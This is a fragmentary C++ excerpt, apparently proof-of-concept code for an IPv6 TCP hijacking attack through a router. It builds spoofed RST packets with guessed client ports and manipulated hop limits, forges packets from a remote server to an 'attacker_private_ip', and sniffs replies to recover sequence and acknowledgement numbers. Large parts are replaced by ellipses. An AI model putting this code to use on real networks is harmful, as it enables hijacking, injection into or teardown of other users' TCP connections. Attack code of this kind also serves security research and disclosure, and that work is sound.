...
void get_seq_ack() {
    ...
    while (true){
        EthernetII rst_pkt = EthernetII(router_mac_address, self_mac_address) / IPv6(router_wan_ip, remote_server_ip) / TCP(guessed_client_port, remote_server_port);
        rst_pkt.rfind_pdu<IPv6>().hop_limit(64);
        ...
        EthernetII pa_pkt = EthernetII(router_mac_address, self_mac_address) / IPv6(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
        ...
        if (!seq_got) {
            ...
            rst_pkt.rfind_pdu<IPv6>().hop_limit(4);
            rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
...
bool callback(const PDU &pdu) {
	...
	if (ip.next_header() == 6 && ip.src_addr() == remote_server_ip) {
...
int main(int argc, char** argv)
{
    ...
    remote_server_ip = IPv6Address(argv[3]);
    remote_server_port = atoi(argv[4]);
    router_wan_ip = IPv6Address(argv[5]);
    packet_iface = argv[6];
